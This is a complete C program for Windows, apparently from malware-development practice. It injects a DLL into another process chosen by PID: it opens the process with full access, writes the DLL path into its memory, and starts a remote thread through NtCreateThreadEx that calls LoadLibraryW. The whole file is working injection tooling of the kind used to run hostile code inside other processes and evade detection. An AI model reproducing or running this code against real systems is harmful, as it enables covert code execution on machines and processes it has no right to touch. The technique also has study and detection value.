#include <stdio.h>
#include <windows.h>

#pragma comment (lib, "ntdll")
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
    );

int main(int argc, char* argv[]) {

    NTSTATUS status;
    DWORD PID = NULL;
    LPVOID rBuffer = NULL;
    HMODULE hKernel32 = NULL;
    HANDLE hProcess = NULL, hThread = NULL;

    wchar_t dllPath[MAX_PATH] = L"C:\\Users\\Bruce\\Documents\\maldev\\example.dll";
    size_t dllSize = sizeof(dllPath), bytesWritten = NULL;
    
    if (argc < 2) {
        warn("usage: %s <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    info("trying to open a handle to the process (%ld)", PID);
    
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, PID);

    if (hProcess == NULL) {
        warn("couldn't create a handle to process (%ld), error: %ld", PID, GetLastError());
        return EXIT_FAILURE;
    }

    okay("got a handle to process (%d)\n\t\\---0x%p", PID, hProcess);
    info("trying to get a handle to Kernel32.dll");

    hKernel32 = GetModuleHandleW(L"Kernel32");

    if (hKernel32 == NULL) {
        warn("couldn't get handle to Kernel32.dll, error: %ld", GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    okay("got handle to Kernel32\n\t\\---0x%p", hKernel32);

    LPTHREAD_START_ROUTINE kawLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    pNtCreateThreadEx kawNtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx");

    okay("got address of LoadLibraryW (kawLoadLibrary)\n\t\\---0x%p", kawLoadLibrary);
    okay("got address of NtCreateThreadEx (kawNtCreateThreadEx)\n\t\\---0x%p", kawNtCreateThreadEx);

    if (kawNtCreateThreadEx == NULL || kawLoadLibrary == NULL) {
        warn("couldn't get address of NtCreateThreadEx/LoadLibraryW, error: %ld\n", GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    rBuffer = VirtualAllocEx(hProcess, NULL, dllSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);

    /* could've just pragma-ignored the rBuffer warning but monke ¯\_(ツ)_/¯ */
    if (rBuffer == NULL) {
        warn("couldn't create rBuffer, error: %ld", GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    okay("created buffer (%zu-bytes), allocated to process memory w/ PAGE_READWRITE permissions", dllSize);

    WriteProcessMemory(hProcess, rBuffer, dllPath, dllSize, &bytesWritten);
    okay("wrote %zu-bytes to process memory", bytesWritten);

    info("using custom NtCreateThreadEx() [kawNtCreateThreadEx] to start a new thread");
    status = kawNtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)kawLoadLibrary, rBuffer, FALSE, NULL, NULL, NULL, NULL);

    if (status != STATUS_SUCCESS) {
        warn("kawNtCreateThreadEx failed to create a thread, error: 0x%x", status);
        return EXIT_FAILURE;
    }
 
    okay("created a new thread, got a handle to the new thread\n\t\\---0x%p", hThread);

    info("waiting for thread to finish executing");
    WaitForSingleObject(hThread, INFINITE);
    okay("thread finished, cleaning up");

    CloseHandle(hThread);
    CloseHandle(hProcess);
    okay("finished! see you next time :>");

    return EXIT_SUCCESS;

}
